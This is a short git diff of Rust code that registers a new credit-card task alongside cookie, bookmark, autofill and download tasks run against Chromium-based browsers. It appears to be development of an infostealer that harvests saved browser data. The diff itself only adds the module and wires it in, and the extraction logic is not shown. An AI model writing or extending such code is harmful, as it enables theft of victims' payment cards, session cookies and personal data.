@@ -1,6 +1,7 @@
 mod cookies;
 mod bookmarks;
 mod autofill;
+mod creditcards;
 mod downloads;
 
 use alloc::borrow::ToOwned;
@@ -15,6 +16,7 @@ use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
 use crate::chromium::downloads::DownloadsTask;
+use crate::chromium::creditcards::CreditCardsTask;
 
 pub struct ChromiumTask<'a> {
     tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
@@ -38,7 +40,8 @@ impl ChromiumTask<'_> {
                     CookiesTask::new(browser.clone()),
                     BookmarksTask::new(browser.clone()),
                     AutoFillTask::new(browser.clone()),
-                    DownloadsTask::new(browser.clone())
+                    DownloadsTask::new(browser.clone()),
+                    CreditCardsTask::new(browser.clone())
                 )
             ))
         }
